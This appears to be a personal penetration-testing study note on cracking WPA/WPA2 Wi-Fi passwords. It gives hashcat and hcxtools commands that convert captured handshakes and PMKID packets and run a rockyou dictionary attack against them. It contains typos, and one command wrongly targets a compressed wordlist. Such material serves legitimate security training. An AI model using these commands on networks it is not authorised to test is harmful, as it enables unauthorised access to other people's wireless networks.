---
tags: [basics, technique, wifi, wireless]
---




## Cracking WPA/WPA2 Handshakes with Hashcat

Hashcat can be used to successfully crack both the MIC (4-way handshake) and PMKID (1st packet/handshake). 

We can capture the 4-way hanshake using a tool such as `airodump-ng` and then format it somehow to something, that can be understood by hashcat. Format required is `hccapx`

To extract it you can use:
- [cap2hashcat online](https://hashcat.net/cap2hashcat/)-> quick and dirty online stuff, never do this with client data
- [hashcat-utils](https://github.com/hashcat/hashcat-utils) if you want to do it offline

```bash
cd hashcat-utils/src
make

# Input is the cap and the output is this hccapx file
./cap2hccapx.bin corp_capture1-01.cap mic_to_crack.hccapx

# Cracking the hash using hashcat 
hashcat -a 0 -m 22000 mic_to_crack.hccapx /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

```

### Visualization of the 4 Way Handshake
![[4WayHandshakeWlan.png]]

## Cracking PMKID (Pairwise Master Key Identifier)
This attack can be performed agains wireless networks that use WPA/WPA2-PSK and allow us tobtain thhe PPSK being used by the target wireless network by attacking the Appp directory. 

![[PMKID.png]]


```bash 
# We need to obtain the pmkid hash
# Installing hcxtools
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools
make && make install 

# Getting Help 
hcxpcapngtool -h

# Extracting the hash
hcxpcapngtool cracking_pmkid.cap -o pmkidhash_corp

# The obtained hash can be cracked using hashcat 
- [ ] hashcat -a 0 -m 22000 pmkidhash_corp /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

```